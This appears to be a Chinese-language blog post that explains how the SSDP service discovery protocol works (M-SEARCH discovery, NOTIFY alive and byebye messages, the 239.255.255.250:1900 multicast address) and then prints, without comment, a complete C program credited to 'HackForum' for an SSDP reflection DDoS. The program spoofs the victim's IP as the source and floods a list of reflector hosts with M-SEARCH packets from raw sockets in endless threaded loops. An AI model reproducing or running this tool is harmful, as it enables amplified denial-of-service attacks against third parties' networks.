title: SSDP
tags:
  - SSDP
categories: []
date: 2017-03-16 20:20:00
---
> 简单服务发现协议提供了在局部网络里面发现设备的机制。控制点(也就是接受服务的客户端)可以通过使用简单服务发现协议，根据自己的需要查询在自己所在的局部网络里面提供特定服务的设备。设备(也就是提供服务的服务器端)也可以通过使用简单服务发现协议，向自己所在的局部网络里面的控制点声明它的存在。

# 实现

简单服务发现协议是在HTTPU和HTTPMU的基础上实现的协议。

按照协议的规定，当一个控制点(客户端)接入网络的时候，它可以向一个特定的多播地址的SSDP端口使用M-SEARCH方法发送"ssdp:discover"消息。当设备监听到这个保留的多播地址上由控制点发送的消息的时候，设备会分析控制点请求的服务，如果自身提供了控制点请求的服务，设备将通过单播的方式直接响应控制点的请求。

类似的，当一个设备接入网络的时候，它应当向一个特定的多播地址的SSDP端口使用NOTIFY方法发送"ssdp:alive"消息。控制点根据自己的策略，处理监听到的消息。考虑到设备可能在没有通知的情况下停止服务或者从网络上卸载，"ssdp:alive"消息必须在HTTP协议头CACHE-CONTROL里面指定超时值，设备必须在约定的超时值到达以前重发"ssdp:alive"消息。如果控制点在指定的超时值内没有再次收到设备发送的"ssdp:alive"消息，控制点将认为设备已经失效。

当一个设备计划从网络上卸载的时候，它也应当向一个特定的多播地址的SSDP端口使用NOTIFY方法发送"ssdp:byebye"消息。但是，即使没有发送"ssdp:byebye"消息，控制点也会根据"ssdp:alive"消息指定的超时值，将超时并且没有再次收到的"ssdp:alive"消息对应的设备认为是失效的设备。

在IPv4环境，当需要使用多播方式传送相关消息的时候，SSDP一般使用多播地址239.255.255.250和UDP端口号1900。

根据互联网地址指派机构的指派，SSDP在IPv6环境下使用多播地址FF0x::C，这里的X根据scope的不同可以有不同的取值。

```C++
/*
This DDoS Script is brought to you by HackForum
*/
#include <time.h>
#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#define MAX_PACKET_SIZE 8192
#define PHI 0x9e3779b9
static uint32_t Q[4096], c = 362436;
struct list
{
	struct sockaddr_in data;
	struct list *next;
	struct list *prev;
};
struct list *head;
struct thread_data{ int thread_id; struct list *list_node; struct sockaddr_in sin; };
void init_rand(uint32_t x)
{
	int i;
	Q[0] = x;
	Q[1] = x + PHI;
	Q[2] = x + PHI + PHI;
	for (i = 3; i < 4096; i++)
	{
		Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
	}
}
 
uint32_t rand_cmwc(void)
{
	uint64_t t, a = 18782LL;
	static uint32_t i = 4095;
	uint32_t x, r = 0xfffffffe;
	i = (i + 1) & 4095;
	t = a * Q[i] + c;
	c = (t >> 32);
	x = t + c;
	if (x < c) {
		x++;
		c++;
	}
	return (Q[i] = r - x);
}
 
/* function for header checksums */
unsigned short csum (unsigned short *buf, int nwords)
{
	unsigned long sum;
	for (sum = 0; nwords > 0; nwords--)
	sum += *buf++;
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	return (unsigned short)(~sum);
}
 
void setup_ip_header(struct iphdr *iph)
{
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 90;
	iph->id = htonl(54321);
	iph->frag_off = 0;
	iph->ttl = MAXTTL;
	iph->protocol = IPPROTO_UDP;
	iph->check = 0;
	iph->saddr = inet_addr("192.168.3.100");
}
 
void setup_udp_header(struct udphdr *udph)
{
	udph->source = htons(5678);
	udph->dest = htons(1900);
	udph->check = 0;
	strcpy((void *)udph + sizeof(struct udphdr), "M-SEARCH * HTTP/1.1\r\nHost:239.255.255.250:1900\r\nST:ssdp:all\r\nMan:\"ssdp:discover\"\r\nMX:5\r\n\r\n");
	udph->len=htons(sizeof(struct udphdr) + 90);
}
 
void *flood(void *par1)
{
	struct thread_data *td = (struct thread_data *)par1;
	char datagram[MAX_PACKET_SIZE];
	struct iphdr *iph = (struct iphdr *)datagram;
	struct udphdr *udph = (/*u_int8_t*/void *)iph + sizeof(struct iphdr);
	struct sockaddr_in sin = td->sin;
	struct  list *list_node = td->list_node;
	int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
	if(s < 0){
		fprintf(stderr, "Could not open raw socket.\n");
		exit(-1);
	}
	init_rand(time(NULL));
	memset(datagram, 0, MAX_PACKET_SIZE);
	setup_ip_header(iph);
	setup_udp_header(udph);
	udph->source = sin.sin_port;
	iph->saddr = sin.sin_addr.s_addr;
	iph->daddr = list_node->data.sin_addr.s_addr;
	iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
	int tmp = 1;
	const int *val = &tmp;
	if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
		fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
		exit(-1);
	}
	int i=0;
	while(1){
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &list_node->data, sizeof(list_node->data));
		list_node = list_node->next;
		iph->daddr = list_node->data.sin_addr.s_addr;
		iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
		if(i==5)
		{
			usleep(0);
			i=0;
		}
		i++;
	}
}
int main(int argc, char *argv[ ])
{
	if(argc < 4){
		fprintf(stderr, "Invalid parameters!\n");
		fprintf(stdout, "Usage: %s <target IP> <target port> <reflection file> <throttle> <time (optional)>\n", argv[0]);
		exit(-1);
	}
	int i = 0;
	head = NULL;
	fprintf(stdout, "Setting up Sockets...\n");
	int max_len = 128;
	char *buffer = (char *) malloc(max_len);
	buffer = memset(buffer, 0x00, max_len);
	int num_threads = atoi(argv[4]);
	FILE *list_fd = fopen(argv[3],  "r");
	while (fgets(buffer, max_len, list_fd) != NULL) {
		if ((buffer[strlen(buffer) - 1] == '\n') ||
				(buffer[strlen(buffer) - 1] == '\r')) {
			buffer[strlen(buffer) - 1] = 0x00;
			if(head == NULL)
			{
				head = (struct list *)malloc(sizeof(struct list));
				bzero(&head->data, sizeof(head->data));
				head->data.sin_addr.s_addr=inet_addr(buffer);
				head->next = head;
				head->prev = head;
			} else {
				struct list *new_node = (struct list *)malloc(sizeof(struct list));
				memset(new_node, 0x00, sizeof(struct list));
				new_node->data.sin_addr.s_addr=inet_addr(buffer);
				new_node->prev = head;
				new_node->next = head->next;
				head->next = new_node;
			}
			i++;
		} else {
			continue;
		}
	}
	struct list *current = head->next;
	pthread_t thread[num_threads];
	struct sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(atoi(argv[2]));
	sin.sin_addr.s_addr = inet_addr(argv[1]);
	struct thread_data td[num_threads];
	for(i = 0;i<num_threads;i++){
		td[i].thread_id = i;
		td[i].sin= sin;
		td[i].list_node = current;
		pthread_create( &thread[i], NULL, &flood, (void *) &td[i]);
	}
	fprintf(stdout, "Starting Flood...\n");
	if(argc > 5)
	{
		sleep(atoi(argv[5]));
	} else {
		while(1){
			sleep(1);
		}
	}
	return 0;
}
```